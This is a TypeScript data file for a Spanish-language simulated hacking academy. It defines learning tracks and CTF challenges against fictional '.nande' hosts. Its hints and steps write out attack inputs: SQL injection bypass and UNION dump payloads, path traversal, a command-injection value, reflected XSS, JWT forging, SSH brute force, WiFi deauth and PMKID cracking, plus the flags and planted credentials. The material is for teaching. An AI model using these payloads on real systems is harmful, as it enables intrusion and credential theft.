/**
 * Itinerarios (rutas de aprendizaje) y Retos (CTF) de la Academia ÑANDE.
 *
 * Un itinerario ordena los cursos interactivos en un CAMINO de cero a experto,
 * con prerrequisitos: no es una pila de cursos sueltos, es un viaje. Al terminar
 * la parte de aprendizaje de una ruta se desbloquea su RETO final: un desafío
 * tipo CTF donde el alumno aplica todo capturando una bandera REAL en el mundo.
 *
 * Los retos NO regalan la bandera: se captura de verdad usando las herramientas
 * (terminal/navegador). El tablero sólo marca ✓ cuando la bandera ya está en el
 * historial del jugador (kernel.player.capturedFlags()). Aprender haciendo.
 */

/** Una ruta de aprendizaje: cursos ordenados + un reto final. */
export interface LearningTrack {
  id: string;
  title: string;
  subtitle: string;
  glyph: string;
  hue: number;
  /** Ids de cursos (de Curriculum), en orden pedagógico. */
  courseIds: string[];
  /** Ruta que conviene completar antes (para el candado suave). */
  requires?: string;
  /**
   * Retos que coronan la ruta (de RETOS): usan una técnica que la ruta enseña.
   * Se desbloquean al completar los cursos de la ruta. Puede estar vacío: no
   * toda ruta termina en un reto (los fundamentos y el recon puro no tienen
   * bandera propia).
   */
  finalChallenges?: string[];
}

/** Un reto tipo CTF: escenario + objetivo + bandera real que lo prueba. */
export interface Challenge {
  id: string;
  title: string;
  /** Historia/contexto del desafío. */
  scenario: string;
  /** Qué hay que lograr, en una línea. */
  objective: string;
  /** La bandera ND{...} que demuestra que se logró (debe existir en el mundo). */
  flag: string;
  difficulty: "fácil" | "media" | "difícil";
  /** Pistas escalonadas (de suave a fuerte). */
  hints: string[];
  /** Comandos sugeridos para practicar (se pueden lanzar a la terminal). */
  steps: string[];
  /** App donde se juega: "terminal" (por defecto) o "browser". */
  app?: "terminal" | "browser";
  /** URL a abrir si es un reto de navegador. */
  url?: string;
  /** Curso que enseña la técnica (para "repasar"). */
  courseId?: string;
  reward: { xp: number; coins: number };
}

/* ------------------------------- RETOS -------------------------------- */

export const RETOS: Challenge[] = [
  {
    id: "r-ssh-brute",
    title: "La puerta de atrás",
    scenario:
      "El servidor server.nande tiene SSH (puerto 22) abierto. El soporte técnico dejó una contraseña floja. Entrá antes que un atacante real.",
    objective: "Conseguí usuario y contraseña de SSH por fuerza bruta.",
    flag: "ND{ssh_fuerza_bruta}",
    difficulty: "media",
    hints: [
      "Primero mirá qué puertos tiene abiertos con nmap.",
      "hydra prueba muchas contraseñas por vos. Necesitás un usuario y una lista.",
      "hydra ssh://server.nande  usa las listas por defecto y encuentra la clave.",
    ],
    steps: ["nmap -p- -sV server.nande", "hydra ssh://server.nande"],
    courseId: "c-pass-hydra",
    reward: { xp: 120, coins: 90 },
  },
  {
    id: "r-pivot",
    title: "El corazón de la red",
    scenario:
      "Comprometiste server.nande. Pero lo valioso —la caja interna— vive en una subred que no se ve desde afuera. Usá el server como trampolín: pivoteá a caja.interna.nande y llevate la bandera de root.",
    objective: "Pivotá al host interno y leé /root/flag.txt.",
    flag: "ND{pivoting_red_interna}",
    difficulty: "difícil",
    hints: [
      "Primero necesitás estar dentro de server.nande (foothold): connect server.nande soporte Verano2024.",
      "Desde adentro, la red interna aparece. La nota del server revela caja.interna.nande y su credencial.",
      "connect caja.interna.nande admin GiraSol#2024  y luego  cat /root/flag.txt",
    ],
    steps: [
      "connect server.nande soporte Verano2024",
      "connect caja.interna.nande admin GiraSol#2024",
      "cat /root/flag.txt",
    ],
    courseId: "c-op-killchain",
    reward: { xp: 260, coins: 200 },
  },
  {
    id: "r-sqli-login",
    title: "Sin la llave, igual entro",
    scenario:
      "El banco banco.nande tiene un login mal programado. Entrá al panel sin conocer ninguna contraseña real.",
    objective: "Burlá el login con una inyección SQL.",
    flag: "ND{sqli_login_bypass}",
    difficulty: "media",
    hints: [
      "El usuario que escribís termina dentro de una consulta SQL.",
      "Cerrá la comilla y agregá una condición siempre verdadera, comentando el resto.",
      "Usuario:  admin' OR '1'='1 --   (cualquier contraseña).",
    ],
    steps: ["curl -X POST http://banco.nande/login -d \"usuario=admin' OR '1'='1 --&password=x\""],
    app: "browser",
    url: "http://banco.nande/",
    courseId: "c-web-sqli",
    reward: { xp: 130, coins: 100 },
  },
  {
    id: "r-sqli-dump",
    title: "Robá la base entera",
    scenario:
      "No alcanza con entrar: el listado de movimientos de banco.nande es inyectable. Sacá todos los usuarios y sus contraseñas.",
    objective: "Volcá la tabla de usuarios con UNION SELECT.",
    flag: "ND{sqli_union_dump}",
    difficulty: "difícil",
    hints: [
      "El buscador de /movimientos necesita sesión: primero entrá con el bypass del login.",
      "El buscador arma la consulta con tu texto. Contá las columnas: son 4.",
      "Cerrá la comilla y sumá UNION SELECT id,usuario,password,rol FROM usuarios-- para traer los usuarios.",
      "sqlmap automatiza esto mismo: sqlmap -u \"http://banco.nande/movimientos?q=a\" --dump",
    ],
    steps: [
      "curl -X POST http://banco.nande/login -d \"usuario=admin' -- &password=x\"",
      "curl \"http://banco.nande/movimientos?q=a%' UNION SELECT id,usuario,password,rol FROM usuarios--\"",
    ],
    courseId: "c-web-sqli-union",
    reward: { xp: 180, coins: 140 },
  },
  {
    id: "r-idor",
    title: "El álbum ajeno",
    scenario:
      "En fotos.arandu.nande cada álbum se pide con ?id=. Mirá el álbum privado de otra persona cambiando ese número.",
    objective: "Accedé a un álbum que no es tuyo (IDOR).",
    flag: "ND{idor_album_ajeno}",
    difficulty: "fácil",
    hints: [
      "El id de la URL lo controlás vos.",
      "Probá cambiar ?id=7 por otros números.",
      "curl http://fotos.arandu.nande/album?id=7",
    ],
    steps: ["curl http://fotos.arandu.nande/album?id=7"],
    app: "browser",
    url: "http://fotos.arandu.nande/",
    courseId: "c-web-idor-traversal",
    reward: { xp: 110, coins: 80 },
  },
  {
    id: "r-traversal",
    title: "Escapar de la carpeta",
    scenario:
      "El visor de documentos de docs.tape.nande recibe un nombre de archivo. Escapá de su carpeta y leé un secreto del servidor.",
    objective: "Leé un archivo fuera de la carpeta permitida (path traversal).",
    flag: "ND{path_traversal_secreto}",
    difficulty: "media",
    hints: [
      "../ sube un nivel de carpeta.",
      "Encadená varios ../ para llegar a la raíz y bajar a config.",
      "curl \"http://docs.tape.nande/ver?archivo=../config/secrets.env\"",
    ],
    steps: ["curl \"http://docs.tape.nande/ver?archivo=../config/secrets.env\""],
    courseId: "c-web-idor-traversal",
    reward: { xp: 140, coins: 100 },
  },
  {
    id: "r-cmdi",
    title: "El comando escondido",
    scenario:
      "La herramienta de ping de tools.pyta.nande arma un comando con lo que escribís. Colá tu propio comando.",
    objective: "Ejecutá un comando extra en el servidor (command injection).",
    flag: "ND{cmd_injection_pwned}",
    difficulty: "difícil",
    hints: [
      "El campo 'host' se mete en un comando del sistema.",
      "El ; separa dos comandos en Linux.",
      "curl \"http://tools.pyta.nande/ping?host=x; cat flag\"",
    ],
    steps: ["curl \"http://tools.pyta.nande/ping?host=x; cat flag\""],
    courseId: "c-web-cmdi-jwt",
    reward: { xp: 170, coins: 130 },
  },
  {
    id: "r-jwt",
    title: "El pase falsificado",
    scenario:
      "Una app usa tokens JWT para saber quién sos. Fabricá uno que diga que sos admin.",
    objective: "Forjá un token de administrador (JWT).",
    flag: "ND{jwt_forged_admin}",
    difficulty: "difícil",
    hints: [
      "Un JWT dice tu rol, y a veces se puede reescribir.",
      "La herramienta jwt del sistema arma tokens.",
      "jwt forge nande123 rol=admin usuario=admin",
    ],
    steps: ["jwt forge nande123 rol=admin usuario=admin"],
    courseId: "c-web-cmdi-jwt",
    reward: { xp: 160, coins: 120 },
  },
  {
    id: "r-xss",
    title: "Código en casa ajena",
    scenario:
      "El buscador de blog.yvoty.nande refleja lo que escribís sin limpiarlo. Hacé que ejecute tu script.",
    objective: "Lográ un XSS reflejado.",
    flag: "ND{xss_reflejado}",
    difficulty: "media",
    hints: [
      "Lo que ponés en ?q= aparece tal cual en la página.",
      "Un <script> se ejecuta si no lo escapan.",
      "curl \"http://blog.yvoty.nande/buscar?q=<script>alert(1)</script>\"",
    ],
    steps: ["curl \"http://blog.yvoty.nande/buscar?q=<script>alert(1)</script>\""],
    app: "browser",
    url: "http://blog.yvoty.nande/",
    courseId: "c-web-xss",
    reward: { xp: 130, coins: 100 },
  },
  {
    id: "r-wifi",
    title: "La clave del vecino (con permiso)",
    scenario:
      "En una prueba autorizada, capturá el handshake WPA2 de la red Vecino-2G y recuperá su clave.",
    objective: "Crackeá la clave WPA2 con la cadena de aircrack.",
    flag: "ND{wifi_wpa_crackeada}",
    difficulty: "difícil",
    hints: [
      "Poné la placa en modo monitor y escuchá el canal correcto.",
      "Un deauth fuerza el handshake; grabá con -w.",
      "aircrack-ng -w rockyou.txt captura-01.cap  (después de capturar el handshake).",
    ],
    steps: [
      "airmon-ng start wlan0",
      "airodump-ng --bssid E8:94:F6:77:88:04 -c 6 -w captura wlan0mon",
      "aireplay-ng --deauth 5 -a E8:94:F6:77:88:04 wlan0mon",
      "aircrack-ng -w rockyou.txt captura-01.cap",
    ],
    courseId: "c-wifi-aircrack",
    reward: { xp: 200, coins: 160 },
  },
  {
    id: "r-pmkid",
    title: "Sin cliente, igual caigo (PMKID)",
    scenario:
      "Oficina-5G (WPA2, 5GHz) no tiene ni un cliente conectado, así que el deauth no sirve. Pero filtra el PMKID: robalo directo del AP (clientless) y crackealo con hashcat.",
    objective: "Capturá el PMKID sin cliente y recuperá la clave con hashcat -m 22000.",
    flag: "ND{wifi_pmkid_crackeado}",
    difficulty: "difícil",
    hints: [
      "Sin clientes, el deauth no captura nada: necesitás el ataque clientless de PMKID.",
      "hcxdumptool le pide el PMKID directo al AP (antes: airmon-ng start wlan0).",
      "hashcat -m 22000 pmkid.pcapng -w rockyou.txt Oficina-5G",
    ],
    steps: [
      "airmon-ng start wlan0",
      "hcxdumptool Oficina-5G",
      "hashcat -m 22000 pmkid.pcapng -w rockyou.txt Oficina-5G",
    ],
    courseId: "c-wifi-aircrack",
    reward: { xp: 240, coins: 190 },
  },
  {
    id: "r-crack",
    title: "El hash filtrado",
    scenario:
      "En una brecha se filtró un hash MD5: 2ab96390c7dbe3439de74d0c9b0b1767. Identificá el tipo y recuperá la contraseña con diccionario.",
    objective: "Identificá el hash y crackealo con john o hashcat.",
    flag: "ND{hash_crackeado}",
    difficulty: "media",
    hints: [
      "Primero identificá el tipo: hashid 2ab96390c7dbe3439de74d0c9b0b1767 (32 hex → MD5).",
      "hashcat usa -m 0 para MD5; pasale el diccionario con -w rockyou.txt.",
      "hashcat -m 0 2ab96390c7dbe3439de74d0c9b0b1767 -w rockyou.txt",
    ],
    steps: [
      "hashid 2ab96390c7dbe3439de74d0c9b0b1767",
      "hashcat -m 0 2ab96390c7dbe3439de74d0c9b0b1767 -w rockyou.txt",
    ],
    courseId: "c-pass-hashes",
    reward: { xp: 150, coins: 110 },
  },
  {
    id: "r-siem",
    title: "El defensor contraataca",
    scenario:
      "Del otro lado del ataque: en el SOC (soc.nande) hay que correlacionar los eventos y confirmar la intrusión.",
    objective: "Correlacioná la alerta en el SIEM.",
    flag: "ND{siem_correlacion}",
    difficulty: "media",
    hints: [
      "Un SIEM junta eventos sueltos en una historia.",
      "Buscá por la IP atacante.",
      "curl http://soc.nande/siem?q=10.10.66.13",
    ],
    steps: ["curl http://soc.nande/siem?q=10.10.66.13"],
    courseId: "c-blue-siem",
    reward: { xp: 140, coins: 100 },
  },
  {
    id: "r-dfir",
    title: "Reconstruir la escena",
    scenario:
      "Hubo una intrusión. Como analista forense, armá la línea de tiempo del incidente en soc.nande.",
    objective: "Reconstruí el timeline del ataque (DFIR).",
    flag: "ND{dfir_timeline}",
    difficulty: "difícil",
    hints: [
      "Ordená qué pasó primero y cuál fue la causa.",
      "El primer evento fue la fuerza bruta; la causa, la inyección SQL.",
      "curl \"http://soc.nande/incidente?primero=fuerza+bruta&causa=inyeccion+sql\"",
    ],
    steps: ["curl \"http://soc.nande/incidente?primero=fuerza+bruta&causa=inyeccion+sql\""],
    courseId: "c-blue-dfir",
    reward: { xp: 170, coins: 130 },
  },
  {
    id: "r-onion",
    title: "Detrás del circuito",
    scenario:
      "Hay un servicio oculto .onion que sólo se alcanza con el circuito de anonimato encendido. Llegá sin dejar rastro.",
    objective: "Alcanzá un servicio oculto con el circuito activo.",
    flag: "ND{onion_alcanzada_con_circuito}",
    difficulty: "difícil",
    hints: [
      "Primero encendé el anonimato.",
      "Los .onion no se resuelven por DNS normal.",
      "anon on && onion biblioteca7k2fx.onion",
    ],
    steps: ["anon on && onion biblioteca7k2fx.onion"],
    courseId: "c-opsec-anon",
    reward: { xp: 160, coins: 120 },
  },
];

/* ----------------------------- ITINERARIOS ---------------------------- */

export const TRACKS: LearningTrack[] = [
  {
    id: "t-fundamentos",
    title: "Fundamentos",
    subtitle: "La base de todo: la terminal, los archivos y cómo funciona Internet.",
    glyph: "sprout",
    hue: 205,
    courseIds: ["c-linux-terminal", "c-linux-archivos", "c-fundamentos", "c-linux-buscar", "c-phishing"],
  },
  {
    id: "t-redes",
    title: "Redes y Reconocimiento",
    subtitle: "Ver la red por dentro y encontrar las puertas de una máquina.",
    glyph: "search",
    hue: 150,
    requires: "t-fundamentos",
    courseIds: ["c-redes-tcpip", "c-redes-captura", "c-redes-servicios", "c-recon-nmap"],
  },
  {
    id: "t-web",
    title: "Hacking Web",
    subtitle: "Romper (y arreglar) las webs mal programadas: SQLi, XSS, IDOR y más.",
    glyph: "code",
    hue: 280,
    requires: "t-redes",
    courseIds: [
      "c-web-como-funciona",
      "c-web-enum",
      "c-web-sqli",
      "c-web-sqli-union",
      "c-web-sqlmap",
      "c-web-xss",
      "c-web-idor-traversal",
      "c-web-cmdi-jwt",
    ],
    finalChallenges: ["r-sqli-dump"],
  },
  {
    id: "t-acceso",
    title: "Acceso y Contraseñas",
    subtitle: "Contraseñas, fuerza bruta, hashes y romper WiFi (con permiso).",
    glyph: "flame",
    hue: 30,
    requires: "t-redes",
    courseIds: ["c-pass-basico", "c-pass-hydra", "c-pass-hashes", "c-wifi-como-funciona", "c-wifi-aircrack"],
    finalChallenges: ["r-ssh-brute", "r-wifi", "r-pmkid", "r-crack"],
  },
  {
    id: "t-defensa",
    title: "Defensa (Blue Team)",
    subtitle: "El otro lado: detectar el ataque, cazarlo con el SIEM y reconstruirlo.",
    glyph: "gem",
    hue: 200,
    requires: "t-redes",
    courseIds: ["c-blue-intro", "c-blue-siem", "c-blue-dfir"],
    finalChallenges: ["r-siem", "r-dfir"],
  },
  {
    id: "t-osint",
    title: "OSINT y Anonimato",
    subtitle: "Investigar con datos públicos y no dejar rastro.",
    glyph: "eye",
    hue: 330,
    courseIds: ["c-osint-basico", "c-opsec-anon"],
    finalChallenges: ["r-onion"],
  },
  {
    id: "t-operaciones",
    title: "Operaciones (Red Team)",
    subtitle: "La metodología completa: de reconocimiento a root, pivotando a la red interna.",
    glyph: "target",
    hue: 0,
    requires: "t-acceso",
    courseIds: ["c-exploit-msf", "c-op-killchain"],
    finalChallenges: ["r-pivot"],
  },
];

/** Acceso a itinerarios y retos, mismo patrón que el resto de la academia. */
export class Tracks {
  all(): LearningTrack[] {
    return TRACKS.map((t) => ({ ...t }));
  }

  get(id: string): LearningTrack | undefined {
    const t = TRACKS.find((x) => x.id === id);
    return t ? { ...t } : undefined;
  }

  challenges(): Challenge[] {
    return RETOS.map((r) => ({ ...r }));
  }

  challenge(id: string): Challenge | undefined {
    const r = RETOS.find((x) => x.id === id);
    return r ? { ...r } : undefined;
  }
}
